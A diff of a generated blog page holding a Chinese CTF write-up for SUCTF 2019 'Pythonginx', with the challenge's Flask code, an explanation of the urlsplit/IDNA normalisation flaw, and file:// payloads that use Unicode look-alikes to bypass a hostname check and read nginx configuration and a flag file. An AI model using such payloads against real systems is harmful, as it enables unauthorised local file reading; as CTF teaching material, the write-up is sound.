@@ -27,16 +27,16 @@
 
   
   
-    <meta name="description" content="题目源码： 12345678910111213141516171819202122232425262728293031323334@app.route(&#x27;&#x2F;getUrl&#x27;, methods&#x3D;[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl():    # 从请求中获取url参数    url &#x3D; request.args.get(&amp;">
+    <meta name="description" content="题目源码： 12345678910111213141516171819202122232425262728293031323334@app.route(&#x27;&#x2F;getUrl&#x27;, methods&#x3D;[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl():    # 从请求中获取url参数    url &#x3D; request.args.get(&amp;q">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[SUCTF 2019]Pythonginx">
 <meta property="og:url" content="http://example.com/2025/03/31/[SUCTF%202019]Pythonginx/index.html">
 <meta property="og:site_name" content="KL">
-<meta property="og:description" content="题目源码： 12345678910111213141516171819202122232425262728293031323334@app.route(&#x27;&#x2F;getUrl&#x27;, methods&#x3D;[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl():    # 从请求中获取url参数    url &#x3D; request.args.get(&amp;">
+<meta property="og:description" content="题目源码： 12345678910111213141516171819202122232425262728293031323334@app.route(&#x27;&#x2F;getUrl&#x27;, methods&#x3D;[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl():    # 从请求中获取url参数    url &#x3D; request.args.get(&amp;q">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-31T10:44:18.000Z">
 <meta property="article:modified_time" content="2025-03-31T11:13:19.245Z">
-<meta property="article:author" content="fuboy">
+<meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="nginx">
 <meta property="article:tag" content="url的unicode漏洞引发的域名安全问题">
 <meta name="twitter:card" content="summary">
@@ -51,6 +51,14 @@
 <link rel="stylesheet" href="/css/style.css">
 
   <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
   
   
   
@@ -196,20 +204,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">nginx配置文件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#urlsplit%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">urlsplit函数存在的漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%8F%AF%E7%94%A8%E5%AD%97%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text">找可用字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">4.</span> <span class="toc-text">寻找flag的位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bflag"><span class="toc-number">5.</span> <span class="toc-text">查看flag</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text"> nginx配置文件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#urlsplit%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> urlsplit函数存在的漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%8F%AF%E7%94%A8%E5%AD%97%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text"> 找可用字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">4.</span> <span class="toc-text"> 寻找flag的位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bflag"><span class="toc-number">5.</span> <span class="toc-text"> 查看flag</span></a></li></ol>
       
   </div>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -217,7 +225,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -299,32 +307,29 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p> 题目源码：</p>
+        <p>题目源码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def getUrl():</span><br><span class="line">    # 从请求中获取url参数</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line"></span><br><span class="line">    # 第一处检查主机名是否为 &#x27;suctf.cc&#x27;</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line"></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[1]</span><br><span class="line"></span><br><span class="line">    # 第二次检查主机名是否为 &#x27;suctf.cc&#x27;</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line"></span><br><span class="line">    # 将主机名的每个部分进行 IDNA 编码</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&#x27;.&#x27;):</span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class="line">    parts[1] = &#x27;.&#x27;.join(newhost)</span><br><span class="line"></span><br><span class="line">    # 去掉URL中的空格并重新组合</span><br><span class="line">    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line"></span><br><span class="line">    # 第三次检查主机名是否为 &#x27;suctf.cc&#x27;</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        # 返回最终URL的内容</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h3 id="nginx配置文件信息"><a href="#nginx配置文件信息" class="headerlink" title="nginx配置文件信息"></a>nginx配置文件信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
-
-<h3 id="urlsplit函数存在的漏洞"><a href="#urlsplit函数存在的漏洞" class="headerlink" title="urlsplit函数存在的漏洞"></a>urlsplit函数存在的漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-9636：urlsplit 不处理 NFKC 标准化</span><br><span class="line">CVE-2019-10160：urlsplit NFKD 标准化漏洞</span><br><span class="line"></span><br><span class="line">漏洞原理：</span><br><span class="line">用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 	URL。</span><br><span class="line">例如，在直接比较中，\ uFF03不等于&#x27;＃&#x27;，而是统一化为&#x27;＃&#x27;，这会更改 URL 的片段部分。类似地，\ u2100 统一化为&#x27;a/c&#x27;，它引入了路径段。</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">url = &#x27;http://www.example.com/a?b&amp;c=1#2&#x27;</span><br><span class="line">&gt;&gt;&gt; host = parse.urlparse(url).hostname	   #urlparse对url进行分割，host等于其中的hostname</span><br><span class="line"></span><br><span class="line">parts = list(parse.urlsplit(url))	#同样的，urlsplit也是分割url，并保存为列表</span><br><span class="line">&gt;&gt;&gt;[&#x27;http&#x27;, &#x27;www.example.com&#x27;, &#x27;/a&#x27;, &#x27;b&amp;c=1&#x27;, &#x27;2&#x27;]</span><br></pre></td></tr></table></figure>
-
-<p>大致分析以下，我们传入url，代码会进行三个if判断是否<strong>host</strong>是<strong>suctf.cc</strong>，但是注意到<strong>只有第三个if判断成功之后才会执行读取文件的操作</strong>，所以这就是我们想要的突破点</p>
+<h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点：</h2>
+<h3 id="nginx配置文件信息"><a class="markdownIt-Anchor" href="#nginx配置文件信息"></a> nginx配置文件信息</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
+<h3 id="urlsplit函数存在的漏洞"><a class="markdownIt-Anchor" href="#urlsplit函数存在的漏洞"></a> urlsplit函数存在的漏洞</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-9636：urlsplit 不处理 NFKC 标准化</span><br><span class="line">CVE-2019-10160：urlsplit NFKD 标准化漏洞</span><br><span class="line"></span><br><span class="line">漏洞原理：</span><br><span class="line">用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 	URL。</span><br><span class="line">例如，在直接比较中，\ uFF03不等于&#x27;＃&#x27;，而是统一化为&#x27;＃&#x27;，这会更改 URL 的片段部分。类似地，\ u2100 统一化为&#x27;a/c&#x27;，它引入了路径段。</span><br></pre></td></tr></table></figure>
+<h2 id="代码分析"><a class="markdownIt-Anchor" href="#代码分析"></a> 代码分析</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">url = &#x27;http://www.example.com/a?b&amp;c=1#2&#x27;</span><br><span class="line">&gt;&gt;&gt; host = parse.urlparse(url).hostname	   #urlparse对url进行分割，host等于其中的hostname</span><br><span class="line"></span><br><span class="line">parts = list(parse.urlsplit(url))	#同样的，urlsplit也是分割url，并保存为列表</span><br><span class="line">&gt;&gt;&gt;[&#x27;http&#x27;, &#x27;www.example.com&#x27;, &#x27;/a&#x27;, &#x27;b&amp;c=1&#x27;, &#x27;2&#x27;]</span><br></pre></td></tr></table></figure>
+<p>大致分析以下，我们传入url，代码会进行三个if判断是否<strong>host</strong>是<strong><a target="_blank" rel="noopener" href="http://suctf.cc">suctf.cc</a></strong>，但是注意到<strong>只有第三个if判断成功之后才会执行读取文件的操作</strong>，所以这就是我们想要的突破点</p>
 <p><strong>第二个if和第三个if之间，数据进行了一次编码解码操作，意思是将域名的各个部分进行idna编码后，再进行utf-8解码</strong></p>
-<p><strong>在我们传入的url中，应该是不存在suctf.cc，否则会被前两个if匹配，但是经历了这次编码解码操作，其中某些字符变为了suctf.cc，第三次if匹配成功，然后会进行读取文件的操作。</strong></p>
-<h2 id="找可用字符"><a href="#找可用字符" class="headerlink" title="找可用字符"></a>找可用字符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">for i in range(128,65537):</span><br><span class="line">    tmp=chr(i)</span><br><span class="line">    try:</span><br><span class="line">        res = tmp.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if(&quot;-&quot;) in res:</span><br><span class="line">            continue</span><br><span class="line">        print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
-
+<p><strong>在我们传入的url中，<a target="_blank" rel="noopener" href="http://xn--suctf-ni1h175c91h4qhkqud08g.cc">应该是不存在suctf.cc</a>，否则会被前两个if匹配，但是经历了这次编码解码操作，<a target="_blank" rel="noopener" href="http://xn--suctf-4n1h5c23a1f24z13g67y670bcu8c.cc">其中某些字符变为了suctf.cc</a>，第三次if匹配成功，然后会进行读取文件的操作。</strong></p>
+<h2 id="找可用字符"><a class="markdownIt-Anchor" href="#找可用字符"></a> 找可用字符</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">for i in range(128,65537):</span><br><span class="line">    tmp=chr(i)</span><br><span class="line">    try:</span><br><span class="line">        res = tmp.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if(&quot;-&quot;) in res:</span><br><span class="line">            continue</span><br><span class="line">        print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
 <p>含有- 就跳过</p>
 <p><strong>我们想替换的是suctf.cc中只要编码解码后是包含在其中即可</strong></p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">U:ℭ    A:c      ascii:8493    ℭ可以替换suctf.cc中的c</span><br><span class="line">U:Ⓣ    A:t      ascii:9417     Ⓣ可以替换suctf.cc中的t</span><br><span class="line">file://suctf.cℭ/usr/local/nginx/conf/nginx.conf</span><br><span class="line">file://sucⓉf.cc/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
-
-<h2 id="寻找flag的位置"><a href="#寻找flag的位置" class="headerlink" title="寻找flag的位置"></a>寻找flag的位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
-
-<p>根据回显，可以得到flag的位置以及文件名称：&#x2F;uesr&#x2F;fffffflag</p>
-<h2 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cℭ/usr/fffffflag</span><br><span class="line">file://suctf.c℆sr/fffffflag</span><br><span class="line">file://sucⓉf.cc/usr/fffffflag</span><br></pre></td></tr></table></figure>
-
+<h2 id="寻找flag的位置"><a class="markdownIt-Anchor" href="#寻找flag的位置"></a> 寻找flag的位置</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
+<p>根据回显，可以得到flag的位置以及文件名称：/uesr/fffffflag</p>
+<h2 id="查看flag"><a class="markdownIt-Anchor" href="#查看flag"></a> 查看flag</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cℭ/usr/fffffflag</span><br><span class="line">file://suctf.c℆sr/fffffflag</span><br><span class="line">file://sucⓉf.cc/usr/fffffflag</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -364,7 +369,7 @@
       
         
         
-          <img data-src="../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[FBCTF2019]RCEService" class="lazyload">
+          <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="[FBCTF2019]RCEService" class="lazyload">
         
       
       <a href="/2025/03/30/%5BFBCTF2019%5DRCEService/"></a>
@@ -400,7 +405,7 @@
       <span class="icon-copyright"></span>
       2020-2025
       <span class="footer-info-sep rotate"></span>
-      fuboy
+      FuB0Y
     </div>
     
       <div>
@@ -411,10 +416,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        115.8k
+        284k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        07:58
+        20:48
       </div>
     
     
@@ -446,20 +451,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">nginx配置文件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#urlsplit%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">urlsplit函数存在的漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%8F%AF%E7%94%A8%E5%AD%97%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text">找可用字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">4.</span> <span class="toc-text">寻找flag的位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bflag"><span class="toc-number">5.</span> <span class="toc-text">查看flag</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text"> nginx配置文件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#urlsplit%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> urlsplit函数存在的漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%8F%AF%E7%94%A8%E5%AD%97%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text"> 找可用字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">4.</span> <span class="toc-text"> 寻找flag的位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bflag"><span class="toc-number">5.</span> <span class="toc-text"> 查看flag</span></a></li></ol>
       
   </div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -467,7 +472,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -587,12 +592,12 @@
       
       <script data-pjax>
         window.REIMU_POST = {
-          author: "fuboy",
+          author: "FuB0Y",
           title: "[SUCTF 2019]Pythonginx",
           url: "http://example.com/2025/03/31/[SUCTF%202019]Pythonginx/",
           excerpt: "",
           description: "",
-          stripContent: " 题目源码： 12345678910111213141516171819202122232425262728293031323334@app.route(&amp;#x27;/getUrl&amp;#x27;, methods=[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;])def getUrl():    # 从请求中获取url参数    url = request.args.get(&amp;quot;url&amp;quot;)    host = parse.urlparse(url).host",
+          stripContent: "题目源码： 12345678910111213141516171819202122232425262728293031323334@app.route(&amp;#x27;/getUrl&amp;#x27;, methods=[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;])def getUrl():    # 从请求中获取url参数    url = request.args.get(&amp;quot;url&amp;quot;)    host = parse.urlparse(url).hostn",
           date: "Mon Mar 31 2025 18:44:18 GMT+0800",
           updated: "Mon Mar 31 2025 19:13:19 GMT+0800",
           cover: "/../images/1737907114de8a.jpg",
@@ -682,6 +687,15 @@
 </script>
 
 
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
 
 
 
